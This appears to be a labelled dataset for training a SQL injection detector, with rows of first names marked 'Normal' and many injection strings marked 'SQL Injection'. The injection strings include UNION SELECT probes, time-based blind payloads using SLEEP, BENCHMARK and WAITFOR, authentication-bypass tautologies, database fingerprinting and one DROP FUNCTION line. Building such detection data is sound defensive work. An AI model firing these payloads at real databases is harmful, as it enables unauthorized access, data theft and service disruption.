+'Hank',Normal
+"'UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9--'",SQL Injection
+"'UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15--'",SQL Injection
+'ORDER BY SLEEP(5)',SQL Injection
+"'UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23'",SQL Injection
+'ORDER BY 4--',SQL Injection
+"'"""") or benchmark(10000000,MD5(1))#'",SQL Injection
+"'UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15#'",SQL Injection
+'' UNION SELECT sum(columnname ) from tablename --',SQL Injection
+"'UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25--'",SQL Injection
+'AND 1083=1083 AND (1427=1427',SQL Injection
+"'SLEEP(1)/*' or SLEEP(1) or '"""" or SLEEP(1) or """"*/'",SQL Injection
+'Charlie',Normal
+'Jill',Normal
+'Hank',Normal
+'AND (SELECT * FROM (SELECT(SLEEP(5)))nQIP)#',SQL Injection
+'Grace',Normal
+'Alice',Normal
+'Grace',Normal
+'1 or sleep(5)#',SQL Injection
+'Eve',Normal
+'1' ORDER BY 1--+',SQL Injection
+'David',Normal
+'David',Normal
+'ORDER BY 9--',SQL Injection
+'Alice',Normal
+'Grace',Normal
+"'UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10#'",SQL Injection
+'Bob',Normal
+'Grace',Normal
+'Hank',Normal
+'Hank',Normal
+'Eve',Normal
+'Bob',Normal
+"'UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14#'",SQL Injection
+'Eve',Normal
+'Hank',Normal
+Microservice running on port 4300,Normal
+'SLEEP(5)='',SQL Injection
+'John',Normal
+'Bob',Normal
+'Eve',Normal
+"'UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6--'",SQL Injection
+'' AND id IS NULL; --',SQL Injection
+'Bob',Normal
+'' or '' '',SQL Injection
+'Bob',Normal
+"'admin"""" or """"1""""=""""1""""--'",SQL Injection
+"'ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7'",SQL Injection
+'OR x=x',SQL Injection
+'David',Normal
+'Alice',Normal
+'ORDER BY 10--',SQL Injection
+"'UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6#'",SQL Injection
+'1)) or pg_sleep(5)--',SQL Injection
+'Bob',Normal
+'John',Normal
+'Bob',Normal
+'Eve',Normal
+"'UNION ALL SELECT 1,2,3,4,5,6#'",SQL Injection
+'Grace',Normal
+'Hank',Normal
+'David',Normal
+'Charlie',Normal
+'Fran',Normal
+'Eve',Normal
+'Bob',Normal
+'Grace',Normal
+'Jill',Normal
+'Hank',Normal
+"'""""*""""'",SQL Injection
+'Hank',Normal
+'Eve',Normal
+"'AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)+CHAR(112)+CHAR(106)+CHAR(107)))'",SQL Injection
+'Charlie',Normal
+'Charlie',Normal
+'Fran',Normal
+'Alice',Normal
+'Hank',Normal
+'Charlie',Normal
+'Grace',Normal
+'John',Normal
+"'"""" or """"""""^""""'",SQL Injection
+"'UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12--'",SQL Injection
+'or SLEEP(5)#',SQL Injection
+'Alice',Normal
+"'UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26#'",SQL Injection
+"'UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16--'",SQL Injection
+"'UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4'",SQL Injection
+"'UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11#'",SQL Injection
+'John',Normal
+'John',Normal
+"'AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)))--'",SQL Injection
+'Fran',Normal
+"'and (select substring(@@version,1,1))='M''",SQL Injection
+'John',Normal
+'Fran',Normal
+'Grace',Normal
+'ORDER BY 14--',SQL Injection
+'Charlie',Normal
+"'UNION ALL SELECT 1,2,3,4,5,6#'",SQL Injection
+'Jill',Normal
+'OR x=y#',SQL Injection
+'Alice',Normal
+'David',Normal
+'Eve',Normal
+"'ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20--'",SQL Injection
+"'UNION ALL SELECT 1,2,3,4,5,6,7,8'",SQL Injection
+"'' AND MID(VERSION(),1,1) = '5';'",SQL Injection
+"',(select * from (select(sleep(10)))a)'",SQL Injection
+"'UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22#'",SQL Injection
+'Eve',Normal
+'ORDER BY 13',SQL Injection
+"'AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)))--'",SQL Injection
+'John',Normal
+'Jill',Normal
+'ORDER BY 16',SQL Injection
+"'""""*""""'",SQL Injection
+"'ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18#'",SQL Injection
+'Grace',Normal
+'Alice',Normal
+'HAVING 1=1#',SQL Injection
+'David',Normal
+'John',Normal
+"'UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17--'",SQL Injection
+'&&SLEEP(5)--',SQL Injection
+'Fran',Normal
+'Jill',Normal
+'Charlie',Normal
+'David',Normal
+"'UNION ALL SELECT 1,2,3,4,5,6,7--'",SQL Injection
+'Eve',Normal
+'Fran',Normal
+'Hank',Normal
+'Charlie',Normal
+'1' ORDER BY 3--+',SQL Injection
+'admin'/*',SQL Injection
+'Hank',Normal
+'Jill',Normal
+'John',Normal
+'Fran',Normal
+'Hank',Normal
+'');,SQL Injection
+'Eve',Normal
+'Hank',Normal
+'AS INJECTX WHERE 1=1 AND 1=0',SQL Injection
+'David',Normal
+"'and (select substring(@@version,1,1))='M''",SQL Injection
+'AND 1=0 AND '%'='',SQL Injection
+'Grace',Normal
+'ORDER BY 9',SQL Injection
+'Bob',Normal
+'WHERE 1=1 AND 1=0#',SQL Injection
+'Charlie',Normal
+'Bob',Normal
+'Eve',Normal
+"'1' ORDER BY 1,2,3--+'",SQL Injection
+'Eve',Normal
+'Jill',Normal
+"'ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6'",SQL Injection
+'Grace',Normal
+"'UNION ALL SELECT CHAR(113)+CHAR(106)+CHAR(122)+CHAR(106)+CHAR(113)+CHAR(110)+CHAR(106)+CHAR(99)+CHAR(73)+CHAR(66)+CHAR(109)+CHAR(119)+CHAR(81)+CHAR(108)+CHAR(88)+CHAR(113)+CHAR(112)+CHAR(106)+CHAR(107)+CHAR(113),NULL--'",SQL Injection
+"'ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13'",SQL Injection
+'Hank',Normal
+'sleep(5)#',SQL Injection
+'Charlie',Normal
+"'UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27#'",SQL Injection
+"'UNION ALL SELECT 1,2,3,4'",SQL Injection
+'Grace',Normal
+'Charlie',Normal
+"'UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8#'",SQL Injection
+'Alice',Normal
+'David',Normal
+"'UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15#'",SQL Injection
+'Charlie',Normal
+"'1' ORDER BY 1,2,3--+'",SQL Injection
+"'or SLEEP(5)=""""'",SQL Injection
+'' or ''&'',SQL Injection
+"''\""""'",SQL Injection
+'Hank',Normal
+'Alice',Normal
+'David',Normal
+'Grace',Normal
+'David',Normal
+'Hank',Normal
+'or 1=1/*',SQL Injection
+'Bob',Normal
+'Grace',Normal
+'AND (SELECT * FROM (SELECT(SLEEP(5)))bAKL) AND 'vRxe'='vRxe',SQL Injection
+'Bob',Normal
+'') or pg_sleep(5)--',SQL Injection
+'Grace',Normal
+'Grace',Normal
+"'1' ORDER BY 1,2--+'",SQL Injection
+'Grace',Normal
+"'UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16--'",SQL Injection
+"'UNION SELECT @@VERSION,SLEEP(5),USER(),4'",SQL Injection
+"'1' ORDER BY 1,2--+'",SQL Injection
+'Bob',Normal
+'Fran',Normal
+'OR 1=1--',SQL Injection
+'Alice',Normal
+'John',Normal
+'Hank',Normal
+"''\""""'",SQL Injection
+"'UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25#'",SQL Injection
+'ORDER BY SLEEP(5)',SQL Injection
+'Alice',Normal
+'Charlie',Normal
+"'1234 ' AND 1=0 UNION ALL SELECT 'admin', '81dc9bdb52d04dc20036dbd8313ed055'",SQL Injection
+'Alice',Normal
+'Hank',Normal
+'Eve',Normal
+"'ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13'",SQL Injection
+'Jill',Normal
+"'UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--'",SQL Injection
+'David',Normal
+'Bob',Normal
+'Hank',Normal
+'Charlie',Normal
+'Grace',Normal
+"'UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--'",SQL Injection
+'David',Normal
+"'and (select substring(@@version,1,1))='X''",SQL Injection
+"'AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)))--'",SQL Injection
+"'UNION ALL SELECT 1,2,3,4,5,6#'",SQL Injection
+"'UNION ALL SELECT 1,2,3,4,5,6,7,8,9--'",SQL Injection
+'John',Normal
+'-- -	SQL comment',SQL Injection
+'Charlie',Normal
+'Fran',Normal
+';,SQL Injection
+'ORDER BY 25',SQL Injection
+'Hank',Normal
+'Bob',Normal
+"'ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29#'",SQL Injection
+'Jill',Normal
+'Fran',Normal
+"'and (select substring(@@version,1,1))='X''",SQL Injection
+'# from wapiti',SQL Injection
+'David',Normal
+'John',Normal
+'David',Normal
+"'ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25--'",SQL Injection
+'Hank',Normal
+"'""""-""""'",SQL Injection
+"'ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23#'",SQL Injection
+'Bob',Normal
+'John',Normal
+"'UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24#'",SQL Injection
+'HAVING 1=0--',SQL Injection
+'or pg_SLEEP(5)--',SQL Injection
+'ORDER BY 1',SQL Injection
+"'UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16--'",SQL Injection
+'Bob',Normal
+'John',Normal
+'Hank',Normal
+'Alice',Normal
+"'ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6#'",SQL Injection
+'Fran',Normal
+'ORDER BY 28#',SQL Injection
+'Fran',Normal
+'John',Normal
+'Bob',Normal
+'Fran',Normal
+"'UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13#'",SQL Injection
+'Eve',Normal
+'David',Normal
+'Eve',Normal
+'Alice',Normal
+'ORDER BY 8#',SQL Injection
+'AND 1=1',SQL Injection
+'Alice',Normal
+'Bob',Normal
+'IF(7423=7423) SELECT 7423 ELSE DROP FUNCTION xcjl--',SQL Injection
+'ORDER BY 7#',SQL Injection
+"'ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15#'",SQL Injection
+'David',Normal
+'' OR 'x'='x',SQL Injection
+'John',Normal
+'John',Normal
+'Hank',Normal
+'ORDER BY 22#',SQL Injection
+"'AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)))#'",SQL Injection
+'OR 1=0',SQL Injection
+"'UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--'",SQL Injection
+'Hank',Normal
+'Charlie',Normal
+"'"""" OR 1 = 1 -- -'",SQL Injection
+'OR 1=1--',SQL Injection
+"'UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14#'",SQL Injection
+'or SLEEP(5)#',SQL Injection
+"'AND 5650=CONVERT(INT,(SELECT CHAR(113)+CHAR(106)+CHAR(122)+CHAR(106)+CHAR(113)+(SELECT (CASE WHEN (5650=5650) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(112)+CHAR(106)+CHAR(107)+CHAR(113)))'",SQL Injection
+'') or ('x')=('x',SQL Injection
+"'AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)+CHAR(88)))#'",SQL Injection
+'Jill',Normal
+'Fran',Normal
+"'UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8#'",SQL Injection
+'';WAITFOR DELAY '0:0:30'--',SQL Injection
+"'' or """"'",SQL Injection
+"'UNION ALL SELECT 1,2,3,4,5#'",SQL Injection
+'David',Normal
+"'UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20#'",SQL Injection
+"'UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24--'",SQL Injection
+'Eve',Normal
+'Grace',Normal
+"'admin""""or 1=1 or """"""""=""""'",SQL Injection
+'Jill',Normal
+"'UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15--'",SQL Injection
+'Eve',Normal
+'IF(7423=7423) SELECT 7423 ELSE DROP FUNCTION xcjl--',SQL Injection
+"'AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)+CHAR(112)+CHAR(106)))--'",SQL Injection
+'Grace',Normal
+'John',Normal
+'Alice',Normal
+"'UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25#'",SQL Injection
+'Bob',Normal
+'David',Normal
+'Hank',Normal
+'Eve',Normal
+'David',Normal
+"',(select * from (select(sleep(10)))a)'",SQL Injection
+'ORDER BY 1',SQL Injection
+'David',Normal
+'Fran',Normal
+"'UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18#'",SQL Injection
+'Jill',Normal
+'Fran',Normal
+'Fran',Normal
+"'AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)))--'",SQL Injection
+'Charlie',Normal
+'Charlie',Normal
+'John',Normal
+'Eve',Normal
+'Alice',Normal
+"'ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11#'",SQL Injection
+'Grace',Normal
+'Charlie',Normal
+'Bob',Normal
+"'AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)))#'",SQL Injection
+'Grace',Normal
+'Jill',Normal
+'Alice',Normal
+'Fran',Normal
+"'AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)))--'",SQL Injection
+'Jill',Normal
+'Charlie',Normal
+'Bob',Normal
+'David',Normal
+"'ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29'",SQL Injection
+'Bob',Normal
+"'UNION ALL SELECT 1,2,3,4,5,6,7'",SQL Injection
+'Alice',Normal
+'Alice',Normal
+'1 or sleep(5)#',SQL Injection
+"'AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)))#'",SQL Injection
+"'or benchmark(50000000,MD5(1))#'",SQL Injection
+"'UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22'",SQL Injection
+'ORDER BY 13#',SQL Injection
+'Charlie',Normal
+'Bob',Normal
+'Hank',Normal
+"'"""" or """"""""*""""'",SQL Injection
+'John',Normal
+'Charlie',Normal
+"'UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6'",SQL Injection
+"'AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)+CHAR(112)+CHAR(106)+CHAR(107)))#'",SQL Injection
+'Eve',Normal
+"'ORDER BY 1,SLEEP(5)#'",SQL Injection
+'Jill',Normal
+'Alice',Normal
+'Jill',Normal
+'John',Normal
+"'UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26--'",SQL Injection
+'AND 1=1#',SQL Injection
+'Jill',Normal
+'Bob',Normal
+'ORDER BY 5#',SQL Injection
+'Eve',Normal
+"'UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17--'",SQL Injection
+"'UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29'",SQL Injection
+'# Numeric',SQL Injection
+'Alice',Normal
+'John',Normal
+'Bob',Normal
+'ORDER BY 18#',SQL Injection
+'Charlie',Normal
+'''',SQL Injection
+'ORDER BY 30#',SQL Injection
+"'admin"""") or """"1""""=""""1""""/*'",SQL Injection
+'Charlie',Normal
+'' and 1 in (select min(name) from sysobjects where xtype = 'U' and name > '.') --',SQL Injection
+'John',Normal
+'John',Normal
+"'UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15#'",SQL Injection
+'WHERE 1=1 AND 1=0',SQL Injection
+'Fran',Normal
+'John',Normal
+'Fran',Normal
+'Hank',Normal
+'Fran',Normal
+'Jill',Normal
+"'""""*""""'",SQL Injection
+'Bob',Normal
+'Bob',Normal
+'John',Normal
+'Charlie',Normal
+'John',Normal
+'John',Normal
+'John',Normal
+"'AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)))'",SQL Injection
+'Grace',Normal
+'Alice',Normal
+"'UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27#'",SQL Injection
+'Fran',Normal
+"'UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL--'",SQL Injection
+"'AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)))'",SQL Injection
+'Alice',Normal
+'IF(7423=7423) SELECT 7423 ELSE DROP FUNCTION xcjl--',SQL Injection
+'Fran',Normal
+'Hank',Normal
+'Eve',Normal
+'Hank',Normal
+'Hank',Normal
+'ORDER BY 7#',SQL Injection
+"'AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)+CHAR(112)+CHAR(106)+CHAR(107)))'",SQL Injection
+'OR x=x--',SQL Injection
+"'AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)))#'",SQL Injection
+'Fran',Normal
+'Jill',Normal
+'1) or sleep(5)#',SQL Injection
+'Bob',Normal
+"'UNION ALL SELECT 1,2,3,4'",SQL Injection
+'AND (SELECT * FROM (SELECT(SLEEP(5)))nQIP)#',SQL Injection
+"'UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29#'",SQL Injection
+'Jill',Normal
+"'UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20#'",SQL Injection
+"'admin"""") or """"1""""=""""1""""/*'",SQL Injection
+'-- -	SQL comment',SQL Injection
+'John',Normal
+'David',Normal
+'ORDER BY 3--',SQL Injection
+'Alice',Normal
+"'AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)+CHAR(88)+CHAR(88)))'",SQL Injection
+'Alice',Normal
+'AS INJECTX WHERE 1=1 AND 1=0',SQL Injection
+'admin' or 1=1',SQL Injection
+'Grace',Normal
+'Bob',Normal
+"'UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--'",SQL Injection
+'Charlie',Normal
+'ORDER BY 18--',SQL Injection
+"'UNION SELECT @@VERSION,SLEEP(5),USER(),4'",SQL Injection
+"'UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11#'",SQL Injection
+'-- -	SQL comment',SQL Injection
+'David',Normal
+"'AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)))#'",SQL Injection
+'Charlie',Normal
+'David',Normal
+"'and (select substring(@@version,2,1))='y''",SQL Injection
+'Alice',Normal
+'waitfor delay '00:00:05'',SQL Injection
+'David',Normal
+'David',Normal
+'Bob',Normal
+'Jill',Normal
+"'UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23#'",SQL Injection
+'Eve',Normal
+"'AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)+CHAR(112)+CHAR(106)+CHAR(107)+CHAR(113)))#'",SQL Injection
+"'UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13--'",SQL Injection
+'Hank',Normal
+'Alice',Normal
+"'ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17#'",SQL Injection
+'David',Normal
+'admin') or '1'='1'#',SQL Injection
+"'UNION ALL SELECT 1,2,3,4'",SQL Injection
+"'AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)+CHAR(112)+CHAR(106)+CHAR(107)+CHAR(113)))#'",SQL Injection
+"'UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14'",SQL Injection
+'Charlie',Normal
+"'UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22'",SQL Injection
+'ORDER BY 26--',SQL Injection
+'Alice',Normal
+"'UNION ALL SELECT 1,2,3,4--'",SQL Injection
+'Jill',Normal
+'Jill',Normal
+'Fran',Normal
+'John',Normal
+'Fran',Normal
+'Fran',Normal
+'Fran',Normal
+"'UNION ALL SELECT 1,2,3,4,5,6,7--'",SQL Injection
+'Bob',Normal
+'David',Normal
+'Jill',Normal
+'ORDER BY 21',SQL Injection
+'Charlie',Normal
+'Eve',Normal
+'David',Normal
+'David',Normal
+'Bob',Normal
+'John',Normal
+"'"""" or pg_sleep(5)--'",SQL Injection
+"'"""")) or ((""""x""""))=((""""x'",SQL Injection
+'Charlie',Normal
+'Bob',Normal
+'Bob',Normal
+"'UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29#'",SQL Injection
+'Alice',Normal
+'Grace',Normal
+"'UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18--'",SQL Injection
+'OR 1=1--',SQL Injection
+'Alice',Normal
+'Fran',Normal
+'Hank',Normal
+"'UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12'",SQL Injection
+'ORDER BY 2--',SQL Injection
+'David',Normal
+Microservice running on port 3000,Normal
+"'UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25--'",SQL Injection
+'Hank',Normal
+'Fran',Normal
+'1)) or pg_sleep(5)--',SQL Injection
+'Fran',Normal
+"'"""")) or ((""""x""""))=((""""x'",SQL Injection
+'Hank',Normal
+'Jill',Normal
+"'1' GROUP BY 1,2,--+'",SQL Injection
+'Hank',Normal
+'Hank',Normal
+'ORDER BY 27',SQL Injection
+'Bob',Normal
+'Alice',Normal
+"'UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--'",SQL Injection
+'Bob',Normal
+'Charlie',Normal
+"'ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10#'",SQL Injection
+'Charlie',Normal
+'Jill',Normal
+'John',Normal
+'OR 1=1',SQL Injection
+'Fran',Normal
+'Grace',Normal
+'David',Normal
+'ORDER BY 27',SQL Injection
+'Fran',Normal
+'AND (SELECT * FROM (SELECT(SLEEP(5)))bAKL) AND 'vRxe'='vRxe',SQL Injection
+"'UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19#'",SQL Injection
+'AS INJECTX WHERE 1=1 AND 1=0',SQL Injection
+'Charlie',Normal
+"'UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15'",SQL Injection
+'Jill',Normal
+'Alice',Normal
